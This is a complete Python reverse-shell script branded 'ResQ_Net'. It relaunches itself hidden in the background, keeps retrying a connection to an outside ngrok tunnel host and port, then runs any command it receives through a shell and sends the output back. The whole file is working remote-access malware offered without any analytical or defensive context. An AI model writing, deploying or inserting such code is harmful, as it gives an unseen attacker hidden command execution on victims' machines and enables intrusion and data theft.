
import os
from sys import argv
bb = "\x1b[1;37m"
try:
	if argv[1] == "do_show":
		import socket, subprocess
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		#sock.setblocking(0)
		sock.settimeout(2)
		HOST = socket.gethostbyname('0.tcp.ngrok.io')
		PORT = 11649
		no_signed = False
		dd = True
		while dd:
			try:
				sock.connect((HOST, PORT))
			except:
				continue
			else:
				dd = False
		logo = """
 ____            ___      _   _      _   
|  _ \ ___  ___ / _ \    | \ | | ___| |_ 
| |_) / _ \/ __| | | |   |  \| |/ _ \ __|
|  _ <  __/\__ \ |_| |   | |\  |  __/ |_ 
|_| \_\___||___/\__\_\___|_| \_|\___|\__|
                    |_____|              


		"""
		sock.send(bb.encode("utf-8")+logo.encode("utf-8"))
		sock.send(b"\nWelcome to ResQ_Net remote shell code executor")
		sock.send(b"\nResQ_Net Shell #> ")
		while True:
			try:
				data = sock.recv(1024).decode("utf-8")
			except:
				continue
			#print(data)
			if data == ":quit":
				break


			proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

			output = proc.stdout.read() + proc.stderr.read()
			#print(output)
			try:
				sock.send(output)
			except BrokenPipeError:
				continue
			
			try:
				sock.send(b"\nResQ_Net Shell #> ")
			except BrokenPipeError:
				continue
		#exit loop 
		sock.send(b"bye")
		sock.close()

except IndexError:
	fname = __file__
	if os.name == "posix" or os.name == "mac":
		cmdo = "python3 {} do_show &>/dev/null &".format(fname)
		#print(cmdo)
		os.system(cmdo)
	elif os.name == "nt":
		os.system("CONSOLESTATE /hide && python3 {} do_show".format(fname))

